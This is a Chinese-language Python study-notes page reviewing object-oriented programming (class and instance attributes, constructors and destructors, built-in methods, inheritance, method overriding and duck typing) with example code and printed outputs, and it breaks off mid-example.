<p>类中的属性对应前面所学习的变量，而类中的方法对应前面所学习的函数。通过类，可以把数据和操作封装在一起，从而使得程序结构更加清晰，这也就是所谓的类的封装性。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20140.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20141.png" alt="image.png"></p>
<p>提示：每次创建对象时，系统都会在内存中选择一块区域分配给对象，每次选择的内存通常是不一样的。因此，实际运行时会看到一个不同的stu对象地址。</p>
<h2 id="类属性定义及其访问"><a href="#类属性定义及其访问" class="headerlink" title="类属性定义及其访问"></a>类属性定义及其访问</h2><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20142.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例：创建Student类对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义Student类</span></span><br><span class="line">    name=<span class="string">&#x27;Unknown&#x27;</span> <span class="comment">#定义Student类中有一个name属性</span></span><br><span class="line">    <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第4行输出：  &#x27;</span>,Student.name)</span><br><span class="line">    stu1=Student() <span class="comment">#创建Student类对象stu1</span></span><br><span class="line">    stu2=Student() <span class="comment">#创建Student类对象stu2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第7行输出：  stu1 %s,stu2 %s&#x27;</span>%(stu1.name,stu2.name))</span><br><span class="line">    Student.name=<span class="string">&#x27;未知&#x27;</span> <span class="comment">#将Student的类属性name赋为“未知”</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第9行输出：  &#x27;</span>,Student.name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第10行输出：  stu1 %s,stu2 %s&#x27;</span>%(stu1.name,stu2.name))</span><br><span class="line">    <span class="comment"># 类属性的访问示例</span></span><br><span class="line">    stu1.name=<span class="string">&#x27;李晓明&#x27;</span> <span class="comment">#将stu1的name属性赋值为“李晓明”</span></span><br><span class="line">    stu2.name=<span class="string">&#x27;马红&#x27;</span> <span class="comment">#将stu2的name属性赋值为“马红”</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第13行输出：  &#x27;</span>,Student.name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第14行输出：  stu1 %s,stu2 %s&#x27;</span>%(stu1.name,stu2.name))</span><br><span class="line">    Student.name=<span class="string">&#x27;学生&#x27;</span> <span class="comment">#将Student的类属性name赋为“学生”</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第16行输出：  &#x27;</span>,Student.name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第17行输出：  stu1 %s,stu2 %s&#x27;</span>%(stu1.name,stu2.name))</span><br><span class="line"></span><br><span class="line"><span class="comment">#第4行输出：   Unknown</span></span><br><span class="line"><span class="comment">#第7行输出：  stu1 Unknown,stu2 Unknown</span></span><br><span class="line"><span class="comment">#第9行输出：   未知</span></span><br><span class="line"><span class="comment">#第10行输出：  stu1 未知,stu2 未知</span></span><br><span class="line"><span class="comment">#第13行输出：未知</span></span><br><span class="line"><span class="comment">#第14行输出：  stu1 李晓明,stu2 马红</span></span><br><span class="line"><span class="comment">#第16行输出：学生</span></span><br><span class="line"><span class="comment">#第17行输出：  stu1 李晓明,stu2 马红</span></span><br></pre></td></tr></table></figure>

<p>为对象动态绑定新属性</p>
<p>Python作为一种动态语言，除了可以在定义类时指定类属性外，还可以动态地为已经创建的对象绑定新的属性。</p>
<p>例：为对象动态绑定新属性示例。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>    <span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义Student类</span></span><br><span class="line"><span class="number">2</span>        name=<span class="string">&#x27;Unknown&#x27;</span> <span class="comment">#定义Student类中有一个name属性</span></span><br><span class="line"><span class="number">3</span>    <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">4</span>        stu1=Student() <span class="comment">#定义Student类对象stu1</span></span><br><span class="line"><span class="number">5</span>        stu2=Student() <span class="comment">#定义Student类对象stu2</span></span><br><span class="line"><span class="number">6</span>        stu1.age=<span class="number">19</span> <span class="comment">#为对象stu1动态绑定新的属性age</span></span><br><span class="line"><span class="number">7</span>        <span class="built_in">print</span>(<span class="string">&#x27;stu1姓名：  %s，年龄：  %d&#x27;</span>%(stu1.name,stu1.age)) <span class="comment">#输出姓名和年龄       </span></span><br><span class="line"><span class="number">8</span>        <span class="comment">#print(&#x27;stu2年龄：  &#x27;%stu2.age) #取消注释则该语句会报错</span></span><br><span class="line"><span class="number">9</span>        <span class="comment">#print(&#x27;使用类名访问年龄属性：  &#x27;%Student.age) #取消注释则该语句会报错</span></span><br></pre></td></tr></table></figure>

<h2 id="类中普通方法定义及调用"><a href="#类中普通方法定义及调用" class="headerlink" title="类中普通方法定义及调用"></a>类中普通方法定义及调用</h2><p>类中的方法实际上就是执行某种数据处理功能的函数。与普通函数定义一样，类中的方法在定义时也需要使用def 关键字。</p>
<p>类中的方法分为两类：普通方法和内置方法。普通方法需要通过类的实例对象根据方法名调用；内置方法是在特定情况下由系统自动执行。</p>
<p><strong>普通方法定义和调用</strong></p>
<p>在定义类的普通方法时，要求第一个参数需要对应调用方法时所使用的实例对象(一般命名为self，但也可以改为其他名字)。</p>
<p>当使用一个实例对象调用类的普通方法时，其语法格式为：<strong>实例对象名.方法名(实参列表)</strong></p>
<p>提示：在通过类的实例对象调用类中的普通方法时，并不需要传入self参数的值，self会自动对应调用该方法时所使用的对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#例：类中普通方法定义及调用示例</span></span><br><span class="line"><span class="number">1</span>             <span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义Student类</span></span><br><span class="line"><span class="number">2</span>                 name=<span class="string">&#x27;Unknown&#x27;</span> <span class="comment">#定义Student类中有一个name属性</span></span><br><span class="line"><span class="number">3</span>                 <span class="keyword">def</span> <span class="title function_">SetName</span>(<span class="params">self, newname</span>): <span class="comment">#定义类的普通方法SetName</span></span><br><span class="line"><span class="number">4</span>                     <span class="variable language_">self</span>.name=newname <span class="comment">#将self对应实例对象中的name属性值赋为newname</span></span><br><span class="line"><span class="number">5</span>                 <span class="keyword">def</span> <span class="title function_">PrintName</span>(<span class="params">self</span>): <span class="comment">#定义类的普通方法PrintName</span></span><br><span class="line"><span class="number">6</span>                          <span class="built_in">print</span>(<span class="string">&#x27;姓名：  %s&#x27;</span>%<span class="variable language_">self</span>.name) <span class="comment">#输出self对应实例对象中的name属性值</span></span><br><span class="line"><span class="number">7</span>             <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">8</span>                 stu1=Student() <span class="comment">#定义Student类对象stu1</span></span><br><span class="line"><span class="number">9</span>                 stu2=Student() <span class="comment">#定义Student类对象stu2</span></span><br><span class="line"><span class="number">10</span>               stu1.SetName(<span class="string">&#x27;李晓明&#x27;</span>) <span class="comment">#通过stu1对象调用SetName方法</span></span><br><span class="line"><span class="number">11</span>               stu2.SetName(<span class="string">&#x27;马红&#x27;</span>) <span class="comment">#通过stu1对象调用SetName方法</span></span><br><span class="line"><span class="number">12</span>               stu1.PrintName() <span class="comment">#通过stu1对象调用PrintName方法</span></span><br><span class="line"><span class="number">13</span>               stu2.PrintName() <span class="comment">#通过stu2对象调用PrintName方法</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20143.png" alt="image.png"></p>
<h2 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h2><p>私有属性，是指在类内可以直接访问、而在类外无法直接访问的属性</p>
<p>Python中规定， 在定义类时，如果一个类属性名是以__ (两个下划线) 开头，则该类属性为私有属性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义Student类                                                                  </span></span><br><span class="line">    name=<span class="string">&#x27;未知&#x27;</span> <span class="comment">#定义Student类中有一个name属性                                     </span></span><br><span class="line">  __<span class="built_in">id</span>=<span class="string">&#x27;未知&#x27;</span> <span class="comment">#定义Student类中有一个__id私有属性                                </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">SetInfo</span>(<span class="params">self,newname,newid</span>): <span class="comment">#定义SetInfo方法                                </span></span><br><span class="line">        <span class="variable language_">self</span>.name=newname <span class="comment">#将self对应实例对象的name属性赋为newname      </span></span><br><span class="line">        <span class="variable language_">self</span>.__<span class="built_in">id</span>=newid <span class="comment">#将self对应实例对象的__id属性赋为newid</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PrintInfo</span>(<span class="params">self</span>): <span class="comment">#定义PrintInfo函数                                                   </span></span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;姓名：  %s，身份证号：  %s&#x27;</span>%(<span class="variable language_">self</span>.name,<span class="variable language_">self</span>.__<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    stu=Student() <span class="comment">#定义Student类对象stu</span></span><br><span class="line">    stu.SetInfo(<span class="string">&#x27;李晓明&#x27;</span>,<span class="string">&#x27;120XXXXXXXXXXXXXXX&#x27;</span>) <span class="comment">#通过stu调用            #SetInfo方法</span></span><br><span class="line"> stu.PrintInfo() <span class="comment">#通过stu对象调用PrintInfo方法</span></span><br><span class="line"> <span class="comment">#print(&#x27;身份证号：  %s&#x27;%stu.__id) #取消前面的注释，则程序会报错</span></span><br></pre></td></tr></table></figure>

<p>类中的方法本质上就是前面所学习的函数，因此，类中的方法也可以有默认参数值。</p>
<p>例如，可以将第4行代码修改为：def SetInfo(self,newname,newid&#x3D;’Unknown’):   #定义SetInfo方法</p>
<p>将第9行代码修改为：stu.SetInfo(‘李晓明’) #通过stu调用SetInfo方法</p>
<h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>构造方法是Python类中的内置方法之一，  它的方法名为_<strong>init_，</strong>在创建一个类对象时会自动执行，负责完成新<br>创建对象的初始化工作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只有一个参数的构造方法示例</span></span><br><span class="line"><span class="number">1</span>   <span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义Student类</span></span><br><span class="line"><span class="number">2</span>       <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">3</span>              <span class="built_in">print</span>(<span class="string">&#x27;构造方法被调用！  &#x27;</span>)</span><br><span class="line"><span class="number">4</span>           <span class="variable language_">self</span>.name=<span class="string">&#x27;未知&#x27;</span> <span class="comment">#将self对应对象的name属性赋值为“未知”</span></span><br><span class="line"><span class="number">5</span>       <span class="keyword">def</span> <span class="title function_">PrintInfo</span>(<span class="params">self</span>): <span class="comment">#定义普通方法PrintInfo</span></span><br><span class="line"><span class="number">6</span>             <span class="built_in">print</span>(<span class="string">&#x27;姓名：  %s&#x27;</span>%<span class="variable language_">self</span>.name) <span class="comment">#输出姓名信息</span></span><br><span class="line"><span class="number">7</span>   <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">8</span>       stu=Student() <span class="comment">#创建Student类对象stu，自动执行构造方法</span></span><br><span class="line"><span class="number">9</span>       stu.PrintInfo() <span class="comment">#通过stu对象调用PrintInfo方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">构造方法被调用！       </span><br><span class="line">姓名：未知</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 带默认参数的构造方法示例</span></span><br><span class="line"><span class="number">1</span>   <span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义Student类</span></span><br><span class="line"><span class="number">2</span>       <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name=<span class="string">&#x27;未知&#x27;</span></span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">3</span>          <span class="built_in">print</span>(<span class="string">&#x27;构造方法被调用！  &#x27;</span>)</span><br><span class="line"><span class="number">4</span>           <span class="variable language_">self</span>.name=name <span class="comment">#将self对应对象的name属性赋为形   #参name的值</span></span><br><span class="line"><span class="number">5</span>       <span class="keyword">def</span> <span class="title function_">PrintInfo</span>(<span class="params">self</span>): <span class="comment">#定义普通方法PrintInfo</span></span><br><span class="line"><span class="number">6</span>          <span class="built_in">print</span>(<span class="string">&#x27;姓名：  %s&#x27;</span>%<span class="variable language_">self</span>.name) <span class="comment">#输出姓名信息</span></span><br><span class="line"><span class="number">7</span>   <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">8</span>       stu1=Student() <span class="comment">#创建Student类对象stu1自动执行构造方法</span></span><br><span class="line"><span class="number">9</span>       stu2=Student(<span class="string">&#x27;李晓明&#x27;</span>)</span><br><span class="line"><span class="number">10</span>      stu1.PrintInfo() <span class="comment">#通过stu1对象调用PrintInfo方法</span></span><br><span class="line"><span class="number">11</span>      stu2.PrintInfo() <span class="comment">#通过stu1对象调用PrintInfo方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">构造方法被调用！       </span><br><span class="line">构造方法被调用！       </span><br><span class="line">姓名：未知</span><br><span class="line">姓名：李晓明</span><br></pre></td></tr></table></figure>

<h2 id="析构方法"><a href="#析构方法" class="headerlink" title="析构方法"></a>析构方法</h2><p>析构方法是类的另一个内置方法，它的方法名为__del__ ，在销毁一个类对象时会自动执行，负责完成待销毁对象的资源清理工作，如关闭文件等。</p>
<p>提示：类对象销毁有如下三种情况：</p>
<p>(1)局部变量的作用域结束。(2)使用del删除对象。(3)程序结束时，程序中的所有对象都将被销毁。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#析构方法示例</span></span><br><span class="line"><span class="number">1</span>   <span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义Student类</span></span><br><span class="line"><span class="number">2</span>       <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">3</span>           <span class="variable language_">self</span>.name=name <span class="comment">#将self对应对象的name属性    #赋值为形参name的值</span></span><br><span class="line"><span class="number">4</span>          <span class="built_in">print</span>(<span class="string">&#x27;姓名为%s的对象被创建！  &#x27;</span>%<span class="variable language_">self</span>.name)</span><br><span class="line"><span class="number">5</span>       <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>): <span class="comment">#定义析构方法</span></span><br><span class="line"><span class="number">6</span>          <span class="built_in">print</span>(<span class="string">&#x27;姓名为%s的对象被销毁！  &#x27;</span>%<span class="variable language_">self</span>.name)</span><br><span class="line"><span class="number">7</span>   <span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">name</span>):</span><br><span class="line"><span class="number">8</span>       stu=Student(name) <span class="comment">#创建Student类对象stu</span></span><br><span class="line"><span class="number">9</span>   <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">10</span>     stu1=Student(<span class="string">&#x27;李晓明&#x27;</span>) <span class="comment">#创建Student类对象stu1</span></span><br><span class="line"><span class="number">11</span>     stu2=Student(<span class="string">&#x27;马红&#x27;</span>) <span class="comment">#创建Student类对象stu2</span></span><br><span class="line"><span class="number">12</span>     stu3=stu2</span><br><span class="line"><span class="number">13</span>     <span class="keyword">del</span> stu2 <span class="comment">#使用del删除stu2对象</span></span><br><span class="line"><span class="number">14</span>     func(<span class="string">&#x27;张刚&#x27;</span>) <span class="comment">#调用func函数</span></span><br><span class="line"><span class="number">15</span>     <span class="keyword">del</span> stu3 <span class="comment">#使用del删除stu3对象</span></span><br><span class="line"><span class="number">16</span>     stu4=Student(<span class="string">&#x27;刘建&#x27;</span>) <span class="comment">#创建Student类对象stu4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#实例：</span></span><br><span class="line">姓名为李晓明的对象被创建！</span><br><span class="line">姓名为马红的对象被创建！</span><br><span class="line">姓名为张刚的对象被创建！</span><br><span class="line">姓名为张刚的对象被销毁！</span><br><span class="line">姓名为马红的对象被销毁！</span><br><span class="line">姓名为刘建的对象被创建！</span><br><span class="line">姓名为李晓明的对象被销毁！</span><br><span class="line">姓名为刘建的对象被销毁！</span><br></pre></td></tr></table></figure>

<p>注意：如果多个变量对应同一片内存空间， 则只有这些变量都删除后才会销毁这片内存空间中所保存的对象，也才会自动执行 析构方法。</p>
<h2 id="常用内置方法"><a href="#常用内置方法" class="headerlink" title="常用内置方法"></a>常用内置方法</h2><p><strong>__str__：</strong>调用str函数对类对象进行处理时或者调用Python内置函数format()和print()时自动执行，  __str__方法的返回值必须是字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>   <span class="keyword">class</span> <span class="title class_">Complex</span>: <span class="comment">#定义复数类Complex</span></span><br><span class="line"><span class="number">2</span>       <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,real,image</span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">3</span>           <span class="variable language_">self</span>.real=real <span class="comment">#将self对应对象的real属性赋值为形参  #real的值</span></span><br><span class="line"><span class="number">4</span>           <span class="variable language_">self</span>.image=image <span class="comment">#将self对应对象的image属性赋值  #为形参image的值</span></span><br><span class="line"><span class="number">5</span>       <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>): <span class="comment">#定义内置方法__str__</span></span><br><span class="line"><span class="number">6</span>           <span class="keyword">return</span> <span class="built_in">str</span>(<span class="variable language_">self</span>.real)+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="variable language_">self</span>.image)+<span class="string">&#x27;i&#x27;</span></span><br><span class="line"><span class="number">7</span>   <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">8</span>       c=Complex(<span class="number">3.2</span>,<span class="number">5.3</span>) <span class="comment">#定义Complex类对象c</span></span><br><span class="line"><span class="number">9</span>      <span class="built_in">print</span>(c) <span class="comment">#输出“3.2+5.3i”</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20144.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>   <span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#定义Student类</span></span><br><span class="line"><span class="number">2</span>       <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>): <span class="comment">#定义构造方法</span></span><br><span class="line"><span class="number">3</span>           <span class="variable language_">self</span>.name=name <span class="comment">#将self对应对象的name属性赋为形参      #name的值</span></span><br><span class="line"><span class="number">4</span>           <span class="variable language_">self</span>.age=age <span class="comment">#将self对应对象的age属性赋为形参age的值</span></span><br><span class="line"><span class="number">5</span>       <span class="keyword">def</span> <span class="title function_">__le__</span>(<span class="params">self, other</span>): <span class="comment">#定义内置方法__le__</span></span><br><span class="line"><span class="number">6</span>           <span class="keyword">return</span> <span class="variable language_">self</span>.age&lt;=other.age</span><br><span class="line"><span class="number">7</span>   <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__’:</span></span><br><span class="line"><span class="string">8       stu1=Student(&#x27;</span>李晓明<span class="string">&#x27;,19) #定义Student类对象stu1</span></span><br><span class="line"><span class="string">9       stu2=Student(&#x27;</span>马红<span class="string">&#x27;,20) #定义Student类对象stu2</span></span><br><span class="line"><span class="string">10    print(&#x27;</span>马红的年龄小于等于李晓明的年龄：  <span class="string">&#x27;, stu2&lt;=stu1)</span></span><br><span class="line"><span class="string">#马红的年龄小于等于李晓明的年龄：   False</span></span><br></pre></td></tr></table></figure>

<h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>继承允许开发者基于已有的类创建新的类。</p>
<p>如果一个类C1通过继承已有类C而创建，则将C1称作子类(sub class)，将C称做基类、父类或超类(base class、super class)。</p>
<p>子类会继承父类中定义的所有属性和方法，另外也能够在子类中增加新的属性和方法。</p>
<p>如果一个子类只有一个父类，则将这种继承关系称为单继承；如果一个子类有两个或更多父类，则将这种继承关系称为多重继承。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20145.png" alt="image.png"></p>
<h2 id="子类的定义"><a href="#子类的定义" class="headerlink" title="子类的定义"></a>子类的定义</h2><p>定义子类时需要指定父类，其语法格式为：</p>
<p>class 子类名(父类名1, 父类名2, …, 父类名M):<br>语句1<br>语句2</p>
<p>…</p>
<p>语句N</p>
<p>当M等于1时，则为单继承；当M大于1时，则为多重继承。例：继承示例。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>          <span class="keyword">class</span> <span class="title class_">Person</span>: <span class="comment">#定义Person类</span></span><br><span class="line"><span class="number">2</span>              <span class="keyword">def</span> <span class="title function_">SetName</span>(<span class="params">self, name</span>): <span class="comment">#定义SetName方法</span></span><br><span class="line"><span class="number">3</span>                  <span class="variable language_">self</span>.name=name <span class="comment">#将self对应对象的name属性赋为形参name的值</span></span><br><span class="line"><span class="number">4</span>          <span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">Person</span>): <span class="comment">#以Person类作为父类定义子类Student</span></span><br><span class="line"><span class="number">5</span>              <span class="keyword">def</span> <span class="title function_">SetSno</span>(<span class="params">self, sno</span>): <span class="comment">#定义SetSno方法</span></span><br><span class="line"><span class="number">6</span>                  <span class="variable language_">self</span>.sno=sno <span class="comment">#将self对应对象的sno属性赋为形参sno的值</span></span><br><span class="line"><span class="number">7</span>          <span class="keyword">class</span> <span class="title class_">Teacher</span>(<span class="title class_ inherited__">Person</span>): <span class="comment">#以Person类作为父类定义子类Teacher</span></span><br><span class="line"><span class="number">8</span>              <span class="keyword">def</span> <span class="title function_">SetTno</span>(<span class="params">self, tno</span>): <span class="comment">#定义SetTno方法</span></span><br><span class="line"><span class="number">9</span>                  <span class="variable language_">self</span>.tno=tno <span class="comment">#将self对应对象的tno属性赋为形参tno的值</span></span><br><span class="line"><span class="number">10</span>        <span class="keyword">class</span> <span class="title class_">TA</span>(Student,Teacher): <span class="comment">#以Student类和Teacher类作为父类                   #定义子类TA</span></span><br><span class="line"><span class="number">11</span>            <span class="keyword">def</span> <span class="title function_">SetTeacher</span>(<span class="params">self, teacher</span>): <span class="comment">#定义SetTeacher方法</span></span><br><span class="line"><span class="number">12</span>                <span class="variable language_">self</span>.teacher=teacher <span class="comment">#将self对象的teacher属性赋为形参                     #teacher的值</span></span><br><span class="line"><span class="number">13</span>        <span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">14</span>            stu=Student() <span class="comment">#定义Student类对象stu</span></span><br><span class="line"><span class="number">15</span>            stu.SetSno(<span class="string">&#x27;1810100&#x27;</span>) <span class="comment">#调用Student类中定义的SetSno方法</span></span><br><span class="line"><span class="number">16</span>            stu.SetName(<span class="string">&#x27;李晓明&#x27;</span>) <span class="comment">#调用Student类从Person类继承过来的SetName      #方法</span></span><br><span class="line"><span class="number">17</span>           <span class="built_in">print</span>(<span class="string">&#x27;学号：  %s，姓名：  %s&#x27;</span>%(stu.sno,stu.name)) <span class="comment">#输出学号和姓名</span></span><br><span class="line"><span class="number">18</span>            t=Teacher() <span class="comment">#定义Teacher类对象t</span></span><br><span class="line"><span class="number">19</span>            t.SetTno(<span class="string">&#x27;998012&#x27;</span>) <span class="comment">#调用Teacher类中定义的SetTno方法</span></span><br><span class="line"><span class="number">20</span>            t.SetName(<span class="string">&#x27;马红&#x27;</span>) <span class="comment">#调用Teacher类从Person类继承过来的SetName方法</span></span><br><span class="line"><span class="number">21</span>           <span class="built_in">print</span>(<span class="string">&#x27;教工号：  %s，姓名：  %s&#x27;</span>%(t.tno,t.name)) <span class="comment">#输出教工号和姓名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#学号：  1810100，姓名：李晓明</span></span><br><span class="line"><span class="comment">#教工号：  998012，姓名：马红</span></span><br></pre></td></tr></table></figure>

<h2 id="方法重写和鸭子类型"><a href="#方法重写和鸭子类型" class="headerlink" title="方法重写和鸭子类型"></a>方法重写和鸭子类型</h2><p>方法重写：是指子类可以对从父类中继承过来的方法进行重新定义，从而使得子类对象可以表现出与父类对象不同的行为。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>: <span class="comment">#定义Person类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>): <span class="comment">#定义构造方法</span></span><br><span class="line">        <span class="variable language_">self</span>.name=name <span class="comment">#将self对象的name属性赋为形参name的值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PrintInfo</span>(<span class="params">self</span>): <span class="comment">#定义PrintInfo方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;姓名：  %s&#x27;</span>%<span class="variable language_">self</span>.name)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">Person</span>): <span class="comment">#以Person类作为父类定义子类Student</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sno, name</span>): <span class="comment">#定义构造方法</span></span><br><span class="line">        <span class="variable language_">self</span>.sno=sno <span class="comment">#将self对象的sno属性赋为形参sno的值</span></span><br><span class="line">        <span class="variable language_">self</span>.name=name <span class="comment">#将self对象的name属性赋为形参name的值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PrintInfo</span>(<span class="params">self</span>): <span class="comment">#定义PrintInfo方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;学号：  %s，姓名：  %s&#x27;</span>%(<span class="variable language_">self</span>.sno,<span class="variable language_">self</span>.name))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PrintPersonInfo</span>(<span class="params">person</span>): <span class="comment">#定义普通函数PrintPersonInfo</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;PrintPersonInfo函数中的输出结果&#x27;</span>, end=<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">        person.PrintInfo() <span class="comment">#通过person调用PrintInfo方法</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">     p=Person(<span class="string">&#x27;李晓明&#x27;</span>) <span class="comment">#创建Person类对象p</span></span><br><span class="line">     stu=Student(<span class="string">&#x27;1810100&#x27;</span>,<span class="string">&#x27;李晓明&#x27;</span>) <span class="comment">#创建Student类对象stu</span></span><br><span class="line">     p.PrintInfo()</span><br><span class="line">     stu.PrintInfo()</span><br><span class="line">     PrintPersonInfo(p) </span><br><span class="line">     PrintPersonInfo(stu)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20146.png" alt="image.png"></p>
<p>鸭子类型：在鸭子类型中，关注的不是对象所属的类，而是一个对象能够如何使用。</p>
<p>在Python中编写一个函数，传递实参前其参数的类型并不确定，在函数中使用形参进行操作时只<br>要传入的对象能够支持该操作程序就能正常执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>          <span class="keyword">class</span> <span class="title class_">Person</span>: <span class="comment">#定义Person类</span></span><br><span class="line"><span class="number">2</span>              <span class="keyword">def</span> <span class="title function_">CaptureImage</span>(<span class="params">self</span>): <span class="comment">#定义CaptureImage方法</span></span><br><span class="line"><span class="number">3</span>                 <span class="built_in">print</span>(<span class="string">&#x27;Person类中的CaptureImage方法被调用！  &#x27;</span>)</span><br><span class="line"><span class="number">4</span>          <span class="keyword">class</span> <span class="title class_">Camera</span>: <span class="comment">#定义Camera类</span></span><br><span class="line"><span class="number">5</span>              <span class="keyword">def</span> <span class="title function_">CaptureImage</span>(<span class="params">self</span>): <span 